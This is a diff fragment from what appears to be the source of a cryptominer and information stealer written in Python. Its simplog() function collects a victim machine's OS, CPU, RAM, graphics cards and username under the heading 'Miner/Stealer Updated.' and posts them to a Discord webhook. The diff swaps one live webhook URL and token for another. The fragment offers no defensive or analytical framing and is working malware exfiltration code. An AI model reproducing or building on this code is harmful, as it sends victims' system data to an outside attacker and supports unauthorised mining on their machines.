@@ -43,7 +43,7 @@ def simplog():
         "content" : "**Miner/Stealer Updated.**\n```> OS Name: {}\n> OS Version: {}\n> CPU: {}\n> RAM: {} GB\n> Graphics Card-1: {}\n> Graphics Card-2: {}```".format(os_name, os_version, proc_info.Name, system_ram, gpu.Name, gpu0.Name),
         "username" : "{}".format(computer_info.Username)
         }         
-    requests.post("https://discord.com/api/webhooks/1032678220287442975/fzP0Nc3F2QrPqNcA-Jb-whD1fGJFNZdd4aL70lyg3DOhqJJ3Mp3McH1q3vly4GAQqqTu", json = data)
+    requests.post("https://discord.com/api/webhooks/1036225289031786526/_u6C8DVHJOZuhSy3SkaBB6ZJIIN_516bm2DXqlnQKigHP80vmCTPc8lz9znrukeZBT7T", json = data)
     time.sleep(3)
 
     
